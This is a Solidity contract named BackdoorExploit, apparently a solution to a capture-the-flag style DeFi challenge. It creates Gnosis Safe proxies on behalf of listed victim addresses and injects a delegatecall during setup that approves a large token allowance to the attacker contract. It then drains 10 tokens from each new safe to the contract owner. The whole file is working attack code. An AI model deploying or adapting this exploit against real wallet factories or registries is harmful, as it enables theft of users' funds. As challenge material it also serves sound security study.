pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "@gnosis.pm/safe-contracts/contracts
// https://eips.ethereum.org/EIPS/eip-20
// SPDX-License-Identifier: MIT
//pragma solidity >=0.5.0 <0.8.0;


interface TrustedProxySafe{
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

interface TrustedProxyFactory{
    function createProxyWithCallback (
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (TrustedProxySafe);
}

contract BackdoorExploit {
    IERC20 DVT;
    TrustedProxyFactory trustedProxyFactory;
    address owner;
    address contractAddress;

    constructor(address dvt, address proxy){
        DVT = IERC20(dvt);
        trustedProxyFactory = TrustedProxyFactory(proxy);
        owner = msg.sender;
    }

    function exploit(address[] calldata victims, address singletonSafe, address registry) external{
        require(msg.sender == owner, "Not for u!");
        contractAddress = address(this);
        for(uint vicIndex = 0; vicIndex < victims.length; vicIndex++){
            address[] memory victim = new address[](1);
            bytes memory delCallData = abi.encodeWithSelector(
                this.approve1337.selector,
                address(DVT),
                address(this)
                );
            victim[0] = victims[vicIndex];
            TrustedProxySafe safe = trustedProxyFactory.createProxyWithCallback(
                singletonSafe, // Logic containing safe address
                abi.encodeWithSelector(
                    TrustedProxySafe.setup.selector, //Function selector
                    victim, // List of safe owners
                    1, // Max safe owners
                    address(this),//contractAddress, // Delegate call address
                    delCallData, // Delegate call function
                    0x0, // Fallback address 
                    address(0), // Token address, unused if value == 0
                    0, // Setup transfer value, none if set to 0
                    address(0) // Token recipient, unused if value == 0
                ), 
                1337, // Nonce
                registry // Callback address
            );
            DVT.transferFrom(address(safe), owner, 10 ether);
        }

    }

    //Delegate call copies only logic, so all utilised data must be provided as argument
    function approve1337(address token, address beneficient) external {
        IERC20(token).approve(beneficient, 1337 ether);
    }

}